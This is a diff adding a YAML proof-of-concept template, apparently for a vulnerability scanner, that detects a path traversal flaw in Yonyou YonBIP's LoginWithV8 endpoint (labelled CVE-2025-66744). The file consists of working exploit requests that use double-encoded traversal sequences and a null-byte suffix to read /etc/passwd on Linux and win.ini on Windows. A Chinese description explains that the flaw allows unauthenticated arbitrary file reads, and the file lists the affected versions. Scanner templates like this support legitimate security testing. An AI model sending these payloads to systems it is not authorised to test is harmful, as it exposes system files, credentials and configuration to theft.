@@ -1,0 +1,27 @@
+name: poc-yaml-yonyou-yonbip-loginwithv8-file-read
+set:
+  rand: randomInt(100000, 999999)
+groups:
+  linux:
+    - method: GET
+      path: /iuap-apcom-workbench/ucf-wh/yonbiplogin/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.png.js
+      follow_redirects: false
+      expression: >
+        response.status == 200 && response.body.bcontains(b"root:x:0:0")
+  windows:
+    - method: GET
+      path: /iuap-apcom-workbench/ucf-wh/yonbiplogin/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252FWindows%252Fwin.ini%2500.png.js
+      follow_redirects: false
+      expression: >
+        response.status == 200 && response.body.bcontains(b"[fonts]")
+detail:
+  author: L4xy
+  description: |
+    用友YonBIP数据应用服务LoginWithV8接口存在路径穿越漏洞（CVE-2025-66744）。
+    攻击者无需身份认证，通过构造特殊的URL路径可绕过文件验证机制，
+    读取服务器任意文件（如/etc/passwd、数据库配置文件等），导致敏感信息泄露。
+    影响版本：YonBIP V3.0(R5_2312)、YonBIP V3.0(R5_2312_SP240517)
+  links:
+    - https://blog.csdn.net/IDHALASHAO/article/details/143888750
+    - https://www.secrss.com/articles/79924
+  tags: fileread,yonyou,yonbip,cve-2025-66744
